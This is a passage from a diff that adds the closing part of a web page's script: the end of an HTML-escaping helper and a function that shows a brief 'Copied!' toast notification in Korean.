+      return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    function showToast() {
+      let t = document.getElementById('toast');
+      if (!t) {
+        t = document.createElement('div');
+        t.id = 'toast';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;background:#238636;color:#fff;padding:.6rem 1.2rem;border-radius:8px;font-size:.85rem;opacity:0;transition:opacity .3s;pointer-events:none';
+        t.textContent = '복사 완료!';
+        document.body.appendChild(t);
+      }
+      t.style.opacity = '1';
+      setTimeout(() => { t.style.opacity = '0'; }, 1500);
+    }
+  </script>
+</body>
+</html>
